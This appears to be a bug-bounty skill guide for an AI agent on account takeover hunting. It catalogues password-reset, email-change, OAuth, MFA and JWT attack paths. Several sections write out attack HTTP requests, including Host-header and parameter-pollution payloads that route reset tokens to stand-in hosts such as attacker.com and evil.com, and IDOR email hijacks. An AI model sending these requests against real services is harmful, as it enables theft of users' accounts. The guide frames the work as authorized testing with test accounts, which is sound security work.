---
name: hunt-ato
description: "Modern Account Takeover hunting (2025-2026). Use when chaining XSS/IDOR/SSRF/JWT/OAuth primitives toward full ATO, when testing password reset / email change / MFA flows, when probing session management, or when looking for the highest-bounty chain on a target. Covers 12 distinct ATO paths + 15 chain templates. PoC requirement: demonstrate login as test victim B from attacker A's session. Skip if no auth surface exists or if all primitives have been validated as non-chainable."
---

# Account Takeover Hunt — 2025-2026 Powerful Edition

ATO is the apex bounty. **Critical-only territory.** Most programs pay 5-50× more for ATO than for the underlying single primitive. This skill catalogs every path to ATO and the chain templates that combine primitives into Critical findings.

> **Rule:** Always have 2 test accounts. Attacker = A, Victim = B. PoC is "from A's session, take over B." Never use real user data.

---

## 0. The 12 Paths to ATO (memorize this list)

| # | Path | Detect | Avg bounty |
|---|------|--------|-----------|
| 1 | Password reset host header injection | `Host:` header reflects in reset email | $2k–$15k |
| 2 | Password reset token leak (Referer) | Reset page has external links | $1k–$8k |
| 3 | Password reset token predictable | Tokens look like timestamp/UUIDv1/counter | $2k–$10k |
| 4 | Password reset race condition | Multiple requests yield colliding tokens | $5k–$30k |
| 5 | Email change without re-auth | PATCH /me {"email":...} accepted | $1k–$5k |
| 6 | OAuth account-link CSRF | Login-with-X without state validation | $3k–$15k |
| 7 | OAuth redirect_uri bypass | redirect_uri allows attacker domain | $5k–$30k |
| 8 | MFA bypass | response manipulation, backup code reuse | $1k–$10k |
| 9 | JWT forge (alg=none, jku, etc) | see hunt-jwt | $2k–$20k |
| 10 | Session fixation | session cookie persists pre→post login | $1k–$5k |
| 11 | Cookie scoping abuse | parent-domain cookie + subdomain takeover | $3k–$15k |
| 12 | Social recovery question abuse | security Q&A enumerable / guessable | $500–$3k |

Plus chain combinations (§3).

---

## 1. Password Reset Vulnerability Matrix

### 1.1 Host Header Injection (highest-frequency ATO)
```http
POST /api/auth/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email":"victim@target.com"}
```
Backend builds reset link from `Host:` → victim's email now points to attacker.com.

**Variants:**
```
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
Forwarded: host=attacker.com
```

**Double Host header**:
```
Host: target.com
Host: attacker.com
```
Some apps use second occurrence in email generation.

### 1.2 Email parameter pollution
```http
POST /api/auth/forgot-password
{"email":"victim@target.com","email":"attacker@evil.com"}

POST /api/auth/forgot-password
{"email":["victim@target.com","attacker@evil.com"]}

POST /api/auth/forgot-password
{"email":"victim@target.com,attacker@evil.com"}

POST /api/auth/forgot-password?email=attacker@evil.com
Body: email=victim@target.com
```
Some impls: token sent to first email; some to all; some to last.

### 1.3 Token in Referer leak
1. Click "reset password" link from email.
2. Reset page contains an external link (e.g., logo → company website, social media icons).
3. Click any external link → Referer header leaks `?token=<reset>` to external site.
4. Attacker controlling external site (or via analytics partner) sees token in their logs.

**Test:** open reset link, inspect page for `<a href="http://external...">` links. Hover; is `Referrer-Policy: no-referrer` set?

### 1.4 Token predictable
Examine multiple reset tokens issued to your account:
- All hex? Length consistent? → maybe HMAC of (user_id + timestamp + weak_secret)
- UUIDv1? → timestamp + MAC, enumerate adjacent UUIDs
- Sequential? → trivial brute
- Base64 of "userid:timestamp"? → forge
- Short numeric (6 digits)? → brute force

**Tools:**
```bash
# Capture 20 tokens for your account, look for pattern
for i in {1..20}; do
  curl -s -X POST https://target.com/api/forgot -d email=you@me.com
  sleep 1
done
# Extract from emails or response, run statistical analysis
```

### 1.5 Token doesn't expire / reuse
- Use a token. Try the SAME token again 5 min later. If accepted → reuse bug.
- Issue 3 tokens for same email. Try OLDEST token. If accepted → no invalidation on new request.

### 1.6 Token usable cross-user
- Request reset for user A → get token T_A.
- Use T_A in reset-confirm endpoint for user B's email.
- If accepted → token not bound to user → ATO any user.

```http
POST /api/auth/reset-password
{"token":"<T_A>","email":"victim@target.com","new_password":"X"}
```

### 1.7 Race condition on reset token issuance (Mars H1 $30k pattern)
```python
# Burp Turbo Intruder — 50 parallel forgot-password for same email
# Some impls generate token, store in DB, send email — race can:
#   - create multiple tokens for same email
#   - one token might be returned in HTTP response by mistake
#   - token storage might collide cross-user under load
```

Specifically: a 0-click ATO has been demonstrated where carefully timed `/forgot-password` requests for the **victim's email** caused the server to return the reset token in the HTTP response.

### 1.8 Reset endpoint authentication bypass
- Reset endpoint doesn't require token? Just submit new password for any email.
- Reset endpoint requires token only on first call? Subsequent reset for same email skips token.

---

## 2. Email Change Without Re-auth

### 2.1 Direct exploit
```http
PATCH /api/me
Authorization: Bearer <attacker-token>
{"email":"victim@target.com"}
```
If accepted without current-password confirmation:
- Attacker's account now claims victim's email.
- Trigger password reset to victim@target.com → attacker controls the reset link (since attacker's account is associated with that email now).

### 2.2 Chain with IDOR
```http
PATCH /api/users/<victim_user_id>
{"email":"attacker@evil.com"}
```
IDOR + email-change-on-behalf = take over victim by changing their email to attacker's.

### 2.3 Mass assignment
```http
POST /api/signup
{"email":"new@a.com","password":"X","role":"admin","verified":true,"linked_emails":["victim@target.com"]}
```

---

## 3. The 15 Chain Templates (memorize)

These are the chains that consistently pay Critical.

```
1. Open redirect + OAuth redirect_uri = auth code theft = 1-click ATO
2. Subdomain takeover + parent-domain cookie = session theft = ATO
3. Subdomain takeover + OAuth redirect_uri allowlist = persistent ATO
4. Stored XSS + admin context = admin ATO via cookie/token exfil
5. XSS + localStorage JWT exfil = ATO (defeats HttpOnly)
6. XSS + autofill form trick = credential capture = ATO
7. XSS + Service Worker install = persistent ATO across logout
8. IDOR + email change endpoint = change victim's email = reset password = ATO
9. Host header injection + password reset = ATO (§1.1)
10. JWT alg=none + role tampering = admin ATO
11. JWT jku injection + sub tampering = arbitrary user impersonation
12. OAuth account-link CSRF + Google = link attacker's Google to victim = login as victim
13. Password reset race + token leak = 0-click ATO
14. MFA bypass + leaked password (breach corpus) = ATO without device
15. CSRF on email-change endpoint + open redirect for state = ATO via Login-CSRF
```

---

## 4. Detection-To-PoC Flow

### Step 1: Identify the surface
Map every auth-related endpoint:
```
/login            /signup           /signin           /sso/login
/logout           /forgot-password  /reset-password   /change-password
/api/me           /api/profile      /api/email        /api/password
/oauth/authorize  /oauth/callback   /auth/link        /auth/unlink
/mfa/setup        /mfa/verify       /mfa/backup-code  /mfa/recovery
```

### Step 2: For each, probe with both accounts

| Endpoint | A's token | B's token | No token |
|----------|-----------|-----------|----------|
| /api/users/A | own | other-user fetch (IDOR) | unauth |
| /api/users/B | other-user fetch | own | unauth |
| /api/users/A/email | own change | IDOR change of A | unauth change |

### Step 3: For password reset, test §1 matrix
- Host header injection
- Parameter pollution
- Token reuse / predictability / cross-user
- Race condition
- Token in Referer

### Step 4: Chain primitives
You have IDOR? → §3.8 chain.
You have XSS? → §3.4-7.
You have open redirect? → §3.1.
You have subdomain takeover? → §3.2-3.

---

## 5. PoC Template

A solid ATO PoC includes:

1. **Setup**
   - Account A (attacker), email `attacker_a@protonmail.com`, password X
   - Account B (victim, your test account), email `victim_b@protonmail.com`, password Y

2. **Exploit (numbered steps with screenshots)**
   - Step 1: As anonymous, send crafted request — show request/response
   - Step 2: Show received email/token at attacker.com
   - Step 3: Submit reset/auth to take over account B
   - Step 4: Show "logged in as victim_b@protonmail.com" in attacker's browser

3. **Impact**
   - "Any user can be taken over by any attacker without prior interaction with the victim."
   - List affected user types (all users? premium? admin? all roles?).
   - Calculate scope (millions of users).

4. **CVSS**
   - AV:N AC:L PR:N UI:N S:U C:H I:H A:H = 9.8 Critical

---

## 6. Validation Gate

Before reporting:
1. **Did you actually log in as victim** from a clean attacker session? (NOT just received the reset email)
2. **Reproducible without race-condition luck?** (If race-based, document timing window.)
3. **Test accounts only?** (Never PoC against real users.)
4. **No info-disclosure dressing as ATO?** (Just because you got a token doesn't mean you can login.)
5. **Chain documented step-by-step?** (Triagers reproduce; missing steps = "not reproducible".)

---

## 7. Disclosed High-Bounty Reports

| Target | Bounty | Path |
|--------|--------|------|
| Mars | $30k+ | 0-click ATO via timed forgot-password requests |
| Multiple H1 | $20k–30k | OAuth redirect_uri bypass → auth code theft |
| Various | $10k–25k | Subdomain takeover → OAuth callback → ATO |
| PayPal | $20k | Stored XSS via cache poisoning → mass ATO |
| Razer | $750–$1.5k | Reflected XSS on payment domain → session theft |
| GitLab | $5k+ | Password reset token leak via Referer |
| Mars (H1 #2142109) | $30k | Timed `/forgot-password` race |
| Yelp | $4k | DOM XSS → Google SSO login keylogger |
| HackerOne (self) | $20k | Session cookie leaked to hacker (validation case) |

---

## 8. Tools

```bash
# Multi-account session juggling
mitmproxy with custom script to swap Authorization headers

# Race condition
Burp Turbo Intruder with parallel workers
Repeater + "Send group in parallel" feature (newer Burp)
ParamSpider for hidden auth params

# Email-receiving infrastructure
ProtonMail + custom alias per account
Mailinator for ephemeral testing
DNS catch-all for testing email-confusion

# Password reset token analysis
TokenLeak Burp extension
Custom Python script to collect tokens, statistical entropy analysis
```

---

## 9. Self-XSS / "Not-Quite-ATO" Trap

Watch for false positives:
- **Self-XSS** that requires user paste — N/A. Not ATO.
- **Reset token in email** that **you receive** for **your own account** — N/A.
- **Email change** that requires confirming new email — only works if new email has additional bug.
- **MFA disabled by user themselves** — N/A.
- **Reset link clicked by you yourself**, not a victim — depends on the chain. Document the cross-account angle.

---

## 10. Quick Decision Tree

```
Identify auth surface (login/reset/email-change/SSO/MFA).

Has password reset?
├── Test Host header injection (§1.1) — 2 min
├── Test parameter pollution (§1.2) — 5 min
├── Look for Referer leak (§1.3) — 5 min
├── Statistical analysis on 20 tokens (§1.4) — 15 min
├── Race condition on token issue (§1.7) — 15 min
└── Cross-user token (§1.6) — 5 min

Has email change endpoint?
├── No re-auth required? (§2.1) - chain with reset
├── IDOR (§2.2) — see hunt-idor

Has OAuth/SSO?
├── See hunt-oauth — state CSRF, redirect_uri, MCP one-click

Has MFA?
├── See hunt-mfa-bypass

Has JWT?
├── See hunt-jwt — claim tampering to ATO

Have primitive (XSS/IDOR/SSRF)?
├── Match to §3 chain template
└── Always escalate toward ATO before reporting

Got chain? → §5 PoC template → §6 validation → submit.
```

---

## 11. Mantras

- Single primitive = Medium. Chain to ATO = Critical.
- Always have 2 test accounts. Always demonstrate cross-account takeover.
- Password reset is the highest-volume ATO surface. Test §1 on every target.
- Race conditions on `/forgot-password` are 2024-2025's biggest unexpected goldmine.
- "I received a reset token" is not ATO. "I logged in as victim B from attacker A's session" is ATO.
- 12 paths. 15 chains. Map every primitive to its chain template.
